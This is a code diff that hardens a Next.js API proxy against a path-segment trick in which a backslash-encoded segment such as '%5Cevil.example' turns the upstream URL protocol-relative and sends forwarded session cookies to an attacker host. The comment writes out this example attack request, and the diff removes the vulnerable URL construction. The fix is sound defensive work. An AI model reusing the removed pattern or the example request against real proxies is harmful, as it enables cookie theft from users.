@@ -41,9 +41,36 @@ const STRIPPED = new Set([
   "accept-encoding",
 ]);
 
+/**
+ * The upstream URL for a catch-all path, built so that no segment can move the origin.
+ *
+ * **A path segment is attacker-controlled, and `new URL(relative, base)` lets a relative
+ * reference change hosts.** Next decodes catch-all params per segment, so a request for
+ * `/api/jutsu/%5Cevil.example/v1/me` arrives as `["\evil.example", "v1", "me"]`; joined
+ * onto a leading slash that is `/\evil.example/v1/me`, and WHATWG parsing treats a
+ * backslash in a special scheme exactly like a slash — so the reference is
+ * `//evil.example/v1/me`, a protocol-relative URL, and the base's host is discarded. An
+ * empty first segment does the same thing without needing the backslash. This handler
+ * forwards every request header, `cookie` included, so the consequence was the session
+ * cookie being delivered to a host of the caller's choosing.
+ *
+ * The origin is therefore fixed first and only the path is assigned, which cannot move
+ * it, and each segment is re-encoded so a separator inside one stays inside it. The
+ * assertion afterwards is not defence in depth for its own sake — it is what makes the
+ * invariant testable rather than a claim about URL parsing.
+ */
+export function upstreamUrl(path: string[], search: string, origin: string = API_ORIGIN): URL {
+  const target = new URL(origin);
+  target.pathname = `/${path.map(encodeURIComponent).join("/")}`;
+  target.search = search;
+  if (target.origin !== new URL(origin).origin) {
+    throw new Error("proxy target escaped the API origin");
+  }
+  return target;
+}
+
 async function forward(request: NextRequest, path: string[]): Promise<Response> {
-  const target = new URL(`/${path.join("/")}`, API_ORIGIN);
-  target.search = request.nextUrl.search;
+  const target = upstreamUrl(path, request.nextUrl.search);
 
   const headers = new Headers();
   request.headers.forEach((value, name) => {
